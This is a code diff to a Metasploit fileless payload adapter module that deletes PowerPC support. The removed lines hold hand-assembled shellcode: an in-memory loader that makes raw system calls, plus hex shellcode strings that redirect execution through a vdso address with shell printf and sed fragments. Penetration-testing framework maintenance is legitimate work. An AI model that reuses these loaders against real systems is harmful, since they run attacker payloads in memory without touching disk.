@@ -139,48 +139,6 @@ module Msf::Payload::Adapter::Fetch::Fileless
 ]
       payload = in_memory_loader_asm.pack('N*')
 
-    when 'ppc'
-      in_memory_loader_asm = [
-          0x0000c039, #0x1000:	li	r14, 0	0x0000c039
-          0x0000c195, #0x1004:	stwu	r14, 0(r1)	0x0000c195
-          0x780b237c, #0x1008:	mr	r3, r1	0x780b237c
-          0x00008038, #0x100c:	li	r4, 0	0x00008038
-          0x68010038, #0x1010:	li	r0, 0x168	0x68010038
-          0x02000044, #0x1014:	sc		0x02000044
-          0x5d000038, #0x1018:	li	r0, 0x5d	0x5d000038
-          0x02000044, #0x101c:	sc		0x02000044
-          0x1d000038, #0x1020:	li	r0, 0x1d	0x1d000038
-          0x02000044, #0x1024:	sc		0x02000044
-      ]
-      payload = in_memory_loader_asm.pack('V*')
-    when 'ppc64'
-      in_memory_loader_asm = [
-          0x39c00000, #0x1000:	li	r14, 0	0x39c00000
-          0x95c10000, #0x1004:	stwu	r14, 0(r1)	0x95c10000
-          0x7c230b78, #0x1008:	mr	r3, r1	0x7c230b78
-          0x38800000, #0x100c:	li	r4, 0	0x38800000
-          0x38000168, #0x1010:	li	r0, 0x168	0x38000168
-          0x44000002, #0x1014:	sc		0x44000002
-          0x3800005d, #0x1018:	li	r0, 0x5d	0x3800005d
-          0x44000002, #0x101c:	sc		0x44000002
-          0x3800001d, #0x1020:	li	r0, 0x1d	0x3800001d
-          0x44000002, #0x1024:	sc		0x44000002
-    ]
-      payload = in_memory_loader_asm.pack('N*')
-    when 'ppc64le'
-      in_memory_loader_asm = [
-          0x0000c039, #0x1000:	li	r14, 0	0x0000c039
-          0x0000c195, #0x1004:	stwu	r14, 0(r1)	0x0000c195
-          0x780b237c, #0x1008:	mr	r3, r1	0x780b237c
-          0x00008038, #0x100c:	li	r4, 0	0x00008038
-          0x68010038, #0x1010:	li	r0, 0x168	0x68010038
-          0x02000044, #0x1014:	sc		0x02000044
-          0x5d000038, #0x1018:	li	r0, 0x5d	0x5d000038
-          0x02000044, #0x101c:	sc		0x02000044
-          0x1d000038, #0x1020:	li	r0, 0x1d	0x1d000038
-          0x02000044, #0x1024:	sc		0x02000044
-      ]
-      payload = in_memory_loader_asm.pack('N*')
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
@@ -246,31 +204,6 @@ module Msf::Payload::Adapter::Fetch::Fileless
     when 'mips64'
       %^"041100000000000001ce7026dfee001001c0000800000000"$(echo $(printf %016x $vdso_addr))^
     
-    # PPC shellcode
-    # bl 4
-    # mflr    r18
-    # lwz     r3,16(r18)
-    # mtlr    r3
-    # blr
-    when 'ppc'
-     %^"480000057e4802a6807200107c6803a64e800020"$(echo $(printf %04x $vdso_addr))^ 
-    
-    # PPC64 shellcode
-    # bl 4
-    # mflr 18
-    # ld 3,16(18)
-    # mtlr 3
-    # blr
-    when 'ppc64'
-      %^"480000057e4802a6e87200107c6803a64e800020"$(echo $(printf %016x $vdso_addr))^
-    # PPC64le shellcode
-    # bl 4
-    # mflr 18
-    # ld 3,16(18)
-    # mtlr 3
-    # blr
-    when 'ppc64le'
-     %^"05000048a602487e100072e8a603687c2000804e"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^ 
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
